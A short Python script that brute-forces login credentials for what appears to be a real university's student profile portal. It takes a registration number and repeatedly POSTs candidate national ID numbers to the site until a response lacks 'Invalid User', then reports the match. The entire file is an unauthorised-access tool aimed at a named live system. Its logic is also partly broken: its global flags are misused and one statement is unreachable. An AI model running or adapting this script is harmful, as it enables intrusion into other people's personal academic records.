#!/usr/bin/env python
import getpass
import requests
import time
import sys
import os
import numpy as np


class ResultChecker:
    global regNumber, count, fullCount, status, banner, nicList, processList, processes, found
    found = 0

    def __init__(self, nicList):
        self.regNumber = ""
        self.nicList = nicList
        self.processList = np.array_split(self.nicList, 10)
    
    def setRegNumber(self, rNumber):
        self.regNumber = rNumber

    def setDetails(self):
        r = input("Registration number >> ")
        self.setRegNumber(r)

    def initiate(self, n):
        if(found == 0):
            count = 0
            proc = self.processList[n]
            fullCount = len(proc)
            status = 1
            target_url = "http://student.sliit.lk/profile/index.php"
            data_dict = {"regno": self.regNumber,"nic": "","submit": "submit"}
            for word in proc:
                data_dict["nic"] = word
                response = requests.post(target_url, data=data_dict)
                if "Invalid User" not in response.content:
                    print("[+] Found a match --> " + word)
                    self.found = 1
                else:
                    status = 0
        else:
            return
            time.sleep(1)
